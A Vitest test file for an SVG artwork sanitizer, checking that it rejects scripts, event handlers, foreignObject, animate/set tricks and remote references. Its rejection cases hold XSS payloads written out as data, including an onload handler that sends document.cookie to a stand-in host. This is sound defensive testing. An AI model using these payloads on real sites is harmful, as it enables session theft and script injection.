import { describe, expect, it } from 'vitest';
import {
  MAX_ART_MARKUP_CHARS,
  isAllowedArtAttribute,
  isSafeArtMarkup,
  normalizeStationArt,
  type StationArt,
} from './station-art';
import { normalizeStationType, type StationType } from './stationTypes';

const art = (svg: string): StationArt => ({ name: 'iron.svg', svg, viewBox: [0, 0, 24, 24] });

describe('isSafeArtMarkup', () => {
  it('accepts the markup the sanitizer produces', () => {
    expect(isSafeArtMarkup('<g><path d="M0 0 L24 24" fill="currentColor"/><rect width="4" height="4"/></g>')).toBe(true);
    expect(isSafeArtMarkup('<text x="2" y="2">IRN</text>')).toBe(true);
  });

  it('rejects elements that can run code or fetch a file', () => {
    for (const markup of [
      '<script>alert(1)</script>',
      '<g><  script>alert(1)</script></g>',
      '<foreignObject><div>hi</div></foreignObject>',
      '<image href="#a"/>',
      '<style>* { fill: red }</style>',
      '<animate attributeName="href" to="javascript:alert(1)"/>',
      '<set attributeName="onclick" to="alert(1)"/>',
    ]) {
      expect(isSafeArtMarkup(markup), markup).toBe(false);
    }
  });

  it('rejects event handlers however they are spaced', () => {
    expect(isSafeArtMarkup('<rect onload="alert(1)"/>')).toBe(false);
    expect(isSafeArtMarkup('<rect onclick ="alert(1)"/>')).toBe(false);
    expect(isSafeArtMarkup('<rect\n  onmouseover="alert(1)"/>')).toBe(false);
  });

  it('allows only same-document references', () => {
    expect(isSafeArtMarkup('<use href="#head"/>')).toBe(true);
    expect(isSafeArtMarkup('<use xlink:href="#head"/>')).toBe(true);
    expect(isSafeArtMarkup('<use href="https://evil.test/x.svg#a"/>')).toBe(false);
    expect(isSafeArtMarkup('<use href="data:image/svg+xml,x"/>')).toBe(false);
  });

  it('allows a local url() and rejects a remote one', () => {
    // The quoted form is the case a `["']?(?!#)` pattern gets wrong.
    expect(isSafeArtMarkup('<rect fill="url(#grad)"/>')).toBe(true);
    expect(isSafeArtMarkup(`<rect fill="url('#grad')"/>`)).toBe(true);
    expect(isSafeArtMarkup('<rect fill="url( #grad )"/>')).toBe(true);
    expect(isSafeArtMarkup('<rect fill="url(https://evil.test/a.png)"/>')).toBe(false);
    expect(isSafeArtMarkup(`<rect style="fill: url('https://evil.test/a.png')"/>`)).toBe(false);
  });

  it('rejects markup past the size cap', () => {
    expect(isSafeArtMarkup(`<path d="${'0 '.repeat(MAX_ART_MARKUP_CHARS)}"/>`)).toBe(false);
  });
});

describe('isAllowedArtAttribute', () => {
  it('keeps paint and geometry, drops handlers, class and outside references', () => {
    expect(isAllowedArtAttribute('fill', 'currentColor')).toBe(true);
    expect(isAllowedArtAttribute('d', 'M0 0 L1 1')).toBe(true);
    expect(isAllowedArtAttribute('fill', 'url(#grad)')).toBe(true);
    expect(isAllowedArtAttribute('onload', 'alert(1)')).toBe(false);
    expect(isAllowedArtAttribute('class', 'st0')).toBe(false);
    expect(isAllowedArtAttribute('href', '#head')).toBe(true);
    expect(isAllowedArtAttribute('xlink:href', 'https://evil.test/a.svg')).toBe(false);
    expect(isAllowedArtAttribute('fill', 'url(https://evil.test/a.png)')).toBe(false);
  });
});

describe('normalizeStationArt', () => {
  it('passes sanitized artwork through unchanged', () => {
    const a = art('<path d="M0 0 L24 24"/>');
    expect(normalizeStationArt(a)).toEqual(a);
  });

  it('drops artwork that is malformed or unsafe', () => {
    expect(normalizeStationArt(undefined)).toBeUndefined();
    expect(normalizeStationArt({ name: 'x', svg: '', viewBox: [0, 0, 1, 1] })).toBeUndefined();
    expect(normalizeStationArt({ name: 'x', svg: '<path/>', viewBox: [0, 0, 0, 1] })).toBeUndefined();
    expect(normalizeStationArt({ name: 'x', svg: '<path/>', viewBox: [0, 0, 1] })).toBeUndefined();
    expect(normalizeStationArt(art('<script>alert(1)</script>'))).toBeUndefined();
  });

  it('caps the filename it will show', () => {
    const long = normalizeStationArt({ ...art('<path/>'), name: 'a'.repeat(200) });
    expect(long?.name).toHaveLength(80);
  });
});

describe('normalizeStationType', () => {
  const base: StationType = {
    id: 'cst-1',
    label: 'Inline iron',
    group: 'Custom',
    form: 'machine',
    glyph: 'plate',
    code: 'irn',
    w: 1,
    d: 2,
    h: 1.4,
    kind: 'Service',
    params: {},
    createdAt: '2026-01-01T00:00:00.000Z',
  };

  it('keeps safe artwork on both slots', () => {
    const t = normalizeStationType({ ...base, planArt: art('<path d="M0 0"/>'), isoArt: art('<rect/>') });
    expect(t.planArt?.svg).toBe('<path d="M0 0"/>');
    expect(t.isoArt?.svg).toBe('<rect/>');
  });

  it('drops artwork a hand-edited project file smuggled in', () => {
    const t = normalizeStationType({
      ...base,
      planArt: art('<rect onload="fetch(`//evil.test?c=${document.cookie}`)"/>'),
      isoArt: art('<image href="https://evil.test/track.png"/>'),
    });
    expect(t.planArt).toBeUndefined();
    expect(t.isoArt).toBeUndefined();
    // The type itself survives — it just falls back to its Form / Mark.
    expect(t.glyph).toBe('plate');
    expect(t.code).toBe('IRN');
  });
});
